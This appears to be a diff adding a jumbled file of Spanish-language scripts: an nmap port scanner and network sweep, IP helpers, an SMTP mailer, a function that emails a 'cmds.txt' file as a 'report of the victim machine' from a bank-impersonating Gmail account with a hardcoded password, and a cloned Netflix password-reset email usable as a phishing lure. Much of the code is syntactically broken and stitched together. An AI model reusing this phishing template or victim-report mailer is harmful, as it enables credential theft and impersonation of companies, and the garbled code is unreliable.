@@ -1,0 +1,353 @@
+from typing import Protocol
+import nmap
+
+host=input("[+] Introduce la  ip del objetivo")
+nmap=nmap.PortScanner
+results=nm.scan(host)
+#print(results)
+print("Host : %s" %host)
+print("State : %s" % nm[host].state())
+for proto in nm[host].all_protocols():
+    print("Protocol :  %s" %proto)
+    lport = nm[host][proto].keys()
+    sorted.(lport)
+    for port in lport:
+        print("port: %s\tstate: %s" % (port, nm[host][proto][port]["state"]))
+
+#--------------------------------------------------------------------------------------#
+
+sudo apt install nmap
+
+#!/bin/bash
+#
+# scan.sh
+network=
+# Salir si no se encuentra nmap
+x=`which nmap 1> /dev/null 2>&1`
+if [ $? -eq 1 ] ; then
+   echo "nmap no instalado"
+   exit 1
+fi
+# Encuentra redes disponibles
+netlist=`ip addr show | grep inet | awk '{print $2}' | egrep -v ^'fe80|127.0|::|fd0c'`
+cnt=1
+echo "Redes disponibles:" ; echo
+echo " 0) Salir"
+for net in $netlist; do
+   echo " $cnt) $net"
+   cnt=`expr $cnt + 1`
+done
+echo
+# Seleccionar red para escanear
+netsel=
+while [ X"$netsel" = X ] ; do
+   echo -n "select : "
+   read netsel
+done
+if [ $netsel -eq 0 ] ; then
+   exit 1
+fi
+cnt=1
+for net in $netlist ; do
+   if [ $cnt -eq $netsel ] ; then
+      network=`echo $net`
+      break
+   fi
+   cnt=`expr $cnt + 1`
+done
+echo "Scaneando $network (un momento)..." ; echo
+network_s=`echo $network | awk -F "." '{print $1"."$2}'`
+nmap -sP ${network} | grep ${network_s} | awk -F " " '{print $5 $6}'
+
+########################################################################################################################
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect(("8.8.8.8", 80))
+print(s.getsockname()[0])
+import socket
+def extract_ip():
+    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:       
+        st.connect(('10.255.255.255', 1))
+        IP = st.getsockname()[0]
+    except Exception:
+        IP = '127.0.0.1'
+    finally:
+        st.close()
+    return IP
+print(extract_ip())
+
+##########################################################################################################################
+
+from openpyxl import Workbook
+from openpyxl import load_workbook
+import os
+
+libro = Workbook()#work(): crea un libro y lo almacenamos en "libro", que será nuestro libro
+pagina= libro.active
+libro.save(".\desktop\Calamardo.xlsx")
+print(libro.sheetnames)
+
+archivo=open(".\desktop\prueba.txt","w")
+archivo.write("Zanahoria\nCoco")
+archivo.close()
+
+archivo=open(".\desktop\prueba.txt","r")
+lineas=archivo.readlines()
+datos=[]
+for i in lineas:
+    datos.append(i)
+archivo.close()
+#lec=len(datos)
+print(datos)
+pagina=datos
+libro.save(".\desktop\Calamardo.xlsx")
+#######################################################
+#m="A"
+#c=0
+#su=m+str(c)
+#list=[]
+#for i in list:
+    #pagina=datos
+#for i in range(lec):
+#    su=m+str(c)
+#    list.append(su)
+#    c+=1
+#q=0
+
+
+
+ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
+ip_add_entered = input("\nPlease enter the ip address that you want to scan: ")
+    if ip_add_pattern.search(ip_add_entered):
+        print(f"{ip_add_entered} is a valid ip address")
+
+#TEXTOO DE CARLOSS!!!!!
+for += 1
+import smtplib ,ssl
+import getpass
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+#pedir datos de inicio de sesion
+usuario= input("Ingrese su nombre de usuario:")
+contraseña=getpass.getpass("Ingrese su  contraseña:")
+
+destinatario = input("Ingrese el correo del destinatario: ")
+asunto = input("Ingrese el asunto a tratar:")
+
+    # Crear la conexion
+    #context = ssl.create_default_context()
+
+    # with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+    #server.login(correo, contraseña)
+    #print("Inicia Sesion!")
+    #cuerpoDelMensaje = input("Ingresa el texto que quieras añadirle: ")
+    #destinatario = input("Ingrese el correo del destinatario: ")
+    #asunto = input("Ingrese el asunto a tratar :")
+    #server.sendmail(correo, destinatario, cuerpoDelMensaje)
+    #print("Mensaje enviado!")
+
+
+# Crear el mensaje
+cuerpoDelMensaje = MIMEMultipart("alternative")
+cuerpoDelMensaje["Subject"] = asunto
+cuerpoDelMensaje["From"] = usuario
+cuerpoDelMensaje["To"] = destinatario
+
+html = f"""
+     ## Aqui puedes solocar tu mensaje en HTML 
+     
+    """
+
+parte_html = MIMEText(html, "html")
+
+cuerpoDelMensaje.attach(parte_html)
+
+#Enviar el mensaje
+archivo = "img2.jpg"
+
+with open(archivo, "rb") as adjunto:
+        contenido_adjunto = MIMEBase("aplication", "octet-stream")
+        contenido_adjunto.set_payload(adjunto.read())
+
+encoders.encode_base64(contenido_adjunto)
+
+contenido_adjunto.add_header(
+        "Content-Dispotition",
+        f"attachment; filename = {archivo}",
+)
+
+cuerpoDelMensaje.attach(contenido_adjunto)
+mensaje_final = cuerpoDelMensaje.as_string()
+
+context = ssl.create_default_context()
+with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+    server.login(usuario, contraseña)
+    print("Seion Iniciada!")
+    server.sendmail(usuario, destinatario, mensaje_final)
+    print("Mensaje Enviado!")
+
+
+##########################################################################################################################
+def enviarcorreo(user="paymentsnoreplybbva@gmail.com", password="Fporeladmin1"):
+    # Pedir datos de inicio de sesion
+    usuario = user
+    contraseña = password
+    destinatario = input("Ingrese el correo del destinatario: ")
+    asunto = input("Ingrese el asunto a tratar:")
+
+    # Crear el mensaje
+    cuerpoDelMensaje = MIMEMultipart("alternative")
+    cuerpoDelMensaje["Subject"] = asunto
+    cuerpoDelMensaje["From"] = usuario
+    cuerpoDelMensaje["To"] = destinatario
+    html = f"""
+        <!DOCTYPE html>
+        <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                <meta name="viewport" content="width=device-width,
+                initial-scale=1.0">
+                <title>Correos_automaticos</title>
+            </head>
+            <body>
+                <h1>Hi,user This is the report of the victim machine</h1>
+                <p>FLAG={'154g-55f5-25s2-h55'}</p>
+            </body>
+        </html>
+        """
+    parte_html = MIMEText(html, "html")
+
+    cuerpoDelMensaje.attach(parte_html)
+    msg = MIMEMultipart()
+    # Enviar el mensaje
+    archivo = "cmds.txt"
+    open(archivo, "r")
+    msg.attach(archivo)
+
+    context = ssl.create_default_context()
+    with smtplib.SMTP_SSL("smtp.gmail.com",
+                            465, context=context) as server:
+        server.login(usuario, contraseña)
+        server.sendmail(usuario, destinatario, msg.as_string())#mensaje_final)
+    print("Mensaje Enviado!")
+
+
+#########################################################################################################################
+
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="style-netflix.css">
+    <title>Documento</title>
+</head>
+<body>
+    <td class="m_2156783665185419462container" id="m_2156783665185419462container" align="center" style="background-color:rgb(234,234,234);margin-top:0"> 
+        <table class="m_2156783665185419462content-shell-table" width="600" cellpadding="0" cellspacing="0" border="0" style="border-spacing:0"> 
+         <tbody>
+          <tr> 
+           <td class="m_2156783665185419462content-shell" bgcolor="#ffffff" style="background-repeat:no-repeat;background-color:rgb(255,255,255);background-image:url(https://ci4.googleusercontent.com/proxy/sfY1Cl0F1Qk33EwXUaIKhxOEKIvmL7_F1QDF7yRtJJCQ5nsGwqI4SjiXxLuHWVRk8s6OhtwA6BfoPawdNgfslTvcThxlOCzBgtx3O9aki6GZQc_EBQ=s0-d-e1-ft#https://assets.nflxext.com/us/email/hitch/netflix-crop-opacity.png)"> 
+            <table class="m_2156783665185419462pixel" cellpadding="0" cellspacing="0" border="0" style="border-spacing:0"> 
+             <tbody>
+              <tr> 
+               <td> 
+                 <img src="https://ci6.googleusercontent.com/proxy/OQYtvFWkCFq89uWWwIJ2WFSIlXgnT-QfXB_iWw0KnMQVreR6bCZ_21j_LlzjjAIiz3lovaftBOJZK7TqOMhDvCo6Q_5gVqCZvXXzEWnqe_yZtiyOWWwRo29qIjmg9cB6BK61r0r0NXDuBirUGxz1fSBuA_FX8qfZBeJRirbj2yr0hn-oH9cTed-Do6p107gTZl1MsyVxJ2e3gCtdvofbud5sa0aED9Ur-7ZwmcVxiSoBpSH6si3uEV4MTykLuP_kkPN4lZtEVfdjpAOUH9Re-zJkf6HK9xf_wiYuWfBzWI7tzC-ZO0e4YBXrRxHV9fOS7ffGEtigON9aNGbviaL-yPv_rEKJlwLN9UnR6Q8oTQCa-5VzBgN2mrbVJVEQpL_K1SR3qyu8fTthMIpo6EUCUWyf5lR1hmnF-hIuX7jZtfSxLaKgmS6zMv0TmyJRnlF1OxnD_x91TYd8HqFfyETyisUOVVAXpt8osJdPPhS2OzZaLNsKOMGVKLpBEev-tS1hvjEOHFduEAI6KVkK-JuCbXZog3AiZ2Ywyc1MONJe4oLXGJZPtybju3TEmxX6EDhjQEcfH4XmMxVaFPK-Ls1Lvgela4UqG_PKL2iEV1pAQCScAAvDFgtYhu2kAbCmdn7m17xWcyyHrgjDj4XvMhhSSjyiwogezgEdb5En9yKGTJHjrSVvPsRwb_6eI3yCMnE7smjZXvnnIR5f-Q=s0-d-e1-ft#https://beaconimages.netflix.net/img/BAQgBEAEa4AJ2THSsgosiINnMMOKPnivWQL9qaUoEx654yzmvjG-3eE4o5fBZ0-coUfueMBs8qRi-OCcZPYI0NNjPdL4IV0uuVUmO6iCyUKeX6Sh1jGRKO5lCPmvzcBlcCCjnos6Hjm9I9nqqLb2j0DAKsFRMZo6QaY-PZSoNpjZcbuBYxxlHAReTZjF8y7MYwN4db6_1HenpAsmlLJ6veruqP1Nvvm7Aqot0DofdQgK1aj9Lk9O-uZTsfLceZaOGagD18CwFJ1Lx1Kea4dLNf8wVMiNfeAW_vggYeYM1DS5LotH2zF58P5KKDROOjI59wzOJnoVyhxpyY1nwzEzZNaivduuaVXlI8QHAF1EGwf9tQXJU_jsljR9libB4ta_OoccVCCsg-rIHYSH8AYA1q3G4Vn7PyVXAV51MY5iLJHNmMBKT1cmx7nBH6Tx8VDKrIhxV--Yhmx61gOYkOWaaZThbKOYVTb9y" style="display:block;border:none;outline:none;overflow:hidden;height:1px;width:1px;border:0;margin:0;padding:0" border="0" class="CToWUd"> </td> 
+              </tr> 
+             </tbody>
+            </table> 
+            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="border-spacing:0"> 
+             <tbody>
+              <tr> 
+               <td class="m_2156783665185419462logo" align="center" style="padding:46px 0 0 0"> <a href="https://www.netflix.com/browse?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_HOME" style="color:inherit" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.netflix.com/browse?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_HOME&amp;source=gmail&amp;ust=1633042388800000&amp;usg=AFQjCNG2Y8sWDrBlN9lDdLjknniDXNYUYA"> <img src="https://ci6.googleusercontent.com/proxy/7IvWo9IEMPmU2P-0IPuZq4XJJYHAHVBK2KAxLwVLJGsDdChMUxc8hXAmgQv0VT2t8SerkcaE589gsndo9cianVgYmUOs7D7UFC-3EBXYWL40=s0-d-e1-ft#https://assets.nflxext.com/us/email/logo/newDesign/logo_v2.png" alt="Netflix" width="145" align="center" style="border:none;outline:none;border-style:none" class="CToWUd"> </a> </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462headline" align="left" style="font-family:Helvetica,Arial,sans;font-weight:bold;font-size:32px;color:rgb(34,31,31);line-height:40px;padding:40px 90px 10px 90px"> <span class="il">Restablece</span> tu contraseña </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462copy" align="left" style="padding:22px 90px 0 90px;font-family:Helvetica Neue,Helvetica,Roboto,Segoe UI,sans-serif;font-size:18px;line-height:24px;color:rgb(34,31,31)"> Hola Perrito Tovar , </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462copy" align="left" style="padding:22px 90px 0 90px;font-family:Helvetica Neue,Helvetica,Roboto,Segoe UI,sans-serif;font-size:18px;line-height:24px;color:rgb(34,31,31)"> Da click <span class="il">en el</span> para resetear tu contraseña </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462button-shell"> 
+                <table class="m_2156783665185419462button"> 
+                 <tbody>
+                  <tr> 
+                   <td class="boton"> <a class="m_2156783665185419462button-link" href=""><span class="il">RESTABLECER</span> CONTRASEÑA</a> </td> 
+                  </tr> 
+                 </tbody>
+                </table> </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462copy" align="left" style="padding:22px 90px 0 90px;font-family:Helvetica Neue,Helvetica,Roboto,Segoe UI,sans-serif;font-size:18px;line-height:24px;color:rgb(34,31,31)"> If you did not ask to <span class="il">reset</span> your password you may want to review your <a href="https://www.netflix.com/accountaccess?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_ACCOUNT_ACCESS" style="color:inherit;text-decoration:underline" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.netflix.com/accountaccess?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_ACCOUNT_ACCESS&amp;source=gmail&amp;ust=1633042388800000&amp;usg=AFQjCNFPjtAg8z0h9hfu_0JJJfzkTqMAeg">recent account access</a> for any unusual activity. </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462copy" align="left" style="padding:22px 90px 0 90px;font-family:Helvetica Neue,Helvetica,Roboto,Segoe UI,sans-serif;font-size:18px;line-height:24px;color:rgb(34,31,31)"> We're here to help if you need it. Visit the <a href="https://help.netflix.com/support/365?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_HELP" style="color:inherit;text-decoration:underline" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://help.netflix.com/support/365?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_HELP&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNGXlj-jmnoazKXRrGyoc-ayFvywcQ">Help Center</a> for more info or <a href="https://help.netflix.com/contactus?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_CONTACT" style="color:inherit;text-decoration:underline" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://help.netflix.com/contactus?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_CONTACT&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNG0K69R8BvUiZKken4K8ZfnhQ9pQg">contact us</a>. </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462copy" align="left" style="padding:22px 90px 0 90px;font-family:Helvetica Neue,Helvetica,Roboto,Segoe UI,sans-serif;font-size:18px;line-height:24px;color:rgb(34,31,31)"> –Your friends at <span class="il">Netflix</span> </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462escape-hatch-neutral-shell" style="padding:30px 90px 0 90px"> <a class="m_2156783665185419462escape-hatch-neutral m_2156783665185419462link" href="https://www.netflix.com/browse?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_HOME_2" style="text-decoration:none;color:inherit" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.netflix.com/browse?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_HOME_2&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNF_ilxIsq2o2jcmv8YESCllhgElAg"> 
+                 <table width="100%" cellpadding="0" cellspacing="0" border="0" style="border-spacing:0"> 
+                  <tbody>
+                   <tr> 
+                    <td class="m_2156783665185419462escape-hatch-neutral m_2156783665185419462text" style="font-family:Helvetica Neue,Helvetica,Roboto,Segoe UI,sans-serif;font-size:15px;line-height:17px;font-weight:bold;padding:17px 0 0 0;vertical-align:bottom;text-decoration:none"> &nbsp; </td> 
+                   </tr> 
+                  </tbody>
+                 </table> </a> </td> 
+              </tr> 
+             </tbody>
+            </table> </td> 
+          </tr> 
+         </tbody>
+        </table> 
+        <table class="m_2156783665185419462footer-shell-table" width="600" style="background-color:rgb(34,31,31);border-spacing:0" cellpadding="0" cellspacing="0" border="0"> 
+         <tbody>
+          <tr> 
+           <td> 
+            <table class="m_2156783665185419462footer" width="100%" cellpadding="0" cellspacing="0" border="0" style="border-spacing:0;background-color:rgb(34,31,31);text-align:left"> 
+            </table>
+            <table class="m_2156783665185419462footer" id="m_2156783665185419462footer" width="600" cellpadding="0" cellspacing="0" border="0" style="border-spacing:0;background-color:rgb(34,31,31);text-align:left"> 
+             <tbody>
+              <tr> 
+               <td class="m_2156783665185419462spacer" style="padding:30px 0 0 0;font-size:0;line-height:0" height="0"> &nbsp; </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462footer-copy" style="font-family:Helvetica,Arial,sans-serif;font-size:13px;color:rgb(169,166,166);padding-left:90px;padding-right:90px;line-height:18px;padding-bottom:10px"> <span>Questions? Visit the <a href="https://help.netflix.com/help?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_HELP_5" style="font-weight:normal;text-decoration:underline;color:rgb(169,166,166);color:inherit" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://help.netflix.com/help?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_HELP_5&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNGaDfId98ReV-kFNTJhfS-bY30GLg"><span>Help Center</span></a></span> </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462footer-copy m_2156783665185419462address" style="padding-bottom:2px;font-family:Helvetica,Arial,sans-serif;font-size:13px;color:rgb(169,166,166);padding-left:90px;padding-right:90px;line-height:18px;padding-bottom:10px"> <span class="m_2156783665185419462footer-no-link"><a href="https://www.netflix.com/browse?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_HOME_4" style="font-weight:normal;text-decoration:underline;color:rgb(169,166,166);color:inherit;text-decoration:none;color:rgb(169,166,166)" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.netflix.com/browse?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_HOME_4&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNFgTC4U0RbgVdIYyHc6gOmoIXP5pA"><span class="il">Netflix</span> México S. DE R.L. DE C.V.</a></span> </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462footer-copy" style="font-family:Helvetica,Arial,sans-serif;font-size:13px;color:rgb(169,166,166);padding-left:90px;padding-right:90px;line-height:18px;padding-bottom:10px"> <a class="m_2156783665185419462footer-link m_2156783665185419462nowrap" href="https://www.netflix.com/ManageSubscriptions?id=BQE0AAEBECvivVJkN8sZ7bItff7qYGiAkJuxY9%2FPjC17iCLUPAql0A0QUXGj5upeFjSIKDCYwWEjbh0f8rDhnNvqrGp8Jlzxa3n4ZjnGPwRbVmyKuu1%2FIxcc7ajNBAEpDGfp9tJgBg1cYkdpXkqyu7UCp72lClr1miD3kaRyZXNj89Wo5OV37QK5x8Z4IcLZaUtuAOvbfha5dz1DhtsbiO%2Fvwq6acOcb3A%3D%3D&amp;mid=none&amp;lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_COMM_SETTINGS" style="font-weight:normal;text-decoration:underline;color:rgb(169,166,166);font-weight:normal;text-decoration:underline;color:rgb(169,166,166);white-space:nowrap;color:inherit" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.netflix.com/ManageSubscriptions?id%3DBQE0AAEBECvivVJkN8sZ7bItff7qYGiAkJuxY9%252FPjC17iCLUPAql0A0QUXGj5upeFjSIKDCYwWEjbh0f8rDhnNvqrGp8Jlzxa3n4ZjnGPwRbVmyKuu1%252FIxcc7ajNBAEpDGfp9tJgBg1cYkdpXkqyu7UCp72lClr1miD3kaRyZXNj89Wo5OV37QK5x8Z4IcLZaUtuAOvbfha5dz1DhtsbiO%252Fvwq6acOcb3A%253D%253D%26mid%3Dnone%26lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_COMM_SETTINGS&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNHSx0xlK_GWnSoy4wfiJyP05HWP7g">Communication Settings</a><span>&nbsp;|</span> <a class="m_2156783665185419462footer-link m_2156783665185419462nowrap" href="https://www.netflix.com/TermsOfUse?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_TERMS" style="font-weight:normal;text-decoration:underline;color:rgb(169,166,166);font-weight:normal;text-decoration:underline;color:rgb(169,166,166);white-space:nowrap;color:inherit" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.netflix.com/TermsOfUse?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_TERMS&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNEdhNgNG8Xar7YiVPHKy_MTDdAbTA">Terms of Use</a><span>&nbsp;|</span> <a class="m_2156783665185419462footer-link m_2156783665185419462nowrap" href="https://www.netflix.com/PrivacyPolicy?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_PRIVACY" style="font-weight:normal;text-decoration:underline;color:rgb(169,166,166);font-weight:normal;text-decoration:underline;color:rgb(169,166,166);white-space:nowrap;color:inherit" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.netflix.com/PrivacyPolicy?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_PRIVACY&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNH6bAQEJNfcAf7zmYHNdjtcIYQSsQ">Privacy</a><span>&nbsp;|</span> <a class="m_2156783665185419462footer-link m_2156783665185419462nowrap" href="https://help.netflix.com/help?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_HELP_6" style="font-weight:normal;text-decoration:underline;color:rgb(169,166,166);font-weight:normal;text-decoration:underline;color:rgb(169,166,166);white-space:nowrap;color:inherit" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://help.netflix.com/help?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_HELP_6&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNH9zt-VIms7KP6Lw1C9PZsUqJ1Jjg">Help Center</a> </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462footer-copy m_2156783665185419462mailTo" style="padding-bottom:0;font-family:Helvetica,Arial,sans-serif;font-size:13px;color:rgb(169,166,166);padding-left:90px;padding-right:90px;line-height:18px;padding-bottom:10px"> This message was mailed to <span class="m_2156783665185419462hide-link" style="text-decoration:none"><a href="https://www.netflix.com/browse?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_HOME_3" style="text-decoration:none;font-weight:normal;text-decoration:underline;color:rgb(169,166,166);color:inherit" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.netflix.com/browse?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_HOME_3&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNG4FIOtNr9Whp7E6MmJEu0L_muVcg"></a></span> by <span class="il">Netflix</span> as part of your <span class="il">Netflix</span>&nbsp;membership. </td> 
+              </tr> 
+              <tr> 
+               <td class="m_2156783665185419462footer-copy m_2156783665185419462src-code" style="padding-bottom:0;font-family:Helvetica,Arial,sans-serif;font-size:13px;color:rgb(169,166,166);padding-left:90px;padding-right:90px;line-height:18px;padding-bottom:10px"> SRC: <a href="https://help.netflix.com/help?lnktrk=EMP&amp;g=C38FA3DD61CA2792B51F17629DC33B856451B543&amp;lkid=URL_HELP_7" class="m_2156783665185419462footer-no-link m_2156783665185419462hide-link" style="text-decoration:none;font-weight:normal;text-decoration:underline;color:rgb(169,166,166);color:inherit;text-decoration:none;color:rgb(169,166,166)" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://help.netflix.com/help?lnktrk%3DEMP%26g%3DC38FA3DD61CA2792B51F17629DC33B856451B543%26lkid%3DURL_HELP_7&amp;source=gmail&amp;ust=1633042388801000&amp;usg=AFQjCNFOA84t-YnOprbwi7iQ_pueQ5Ixjg">12546_en_MX</a> </td> 
+              </tr> 
+              <tr class="m_2156783665185419462mobile-hide"> 
+               <td class="m_2156783665185419462spacer" style="padding:30px 0 0 0;font-size:0;line-height:0" height="0"> &nbsp; </td> 
+              </tr> 
+              <tr class="m_2156783665185419462desktop-hide m_2156783665185419462mobile-block" style="display:none"> 
+               <td class="m_2156783665185419462spacer" style="padding:24px 0 0 0;font-size:0;line-height:0" height="0"> &nbsp; </td> 
+              </tr> 
+             </tbody>
+            </table> </td>
+          </tr>
+         </tbody>
+        </table> </td>
+</body>
+</html>
+
+##########################################################################################################################################################################
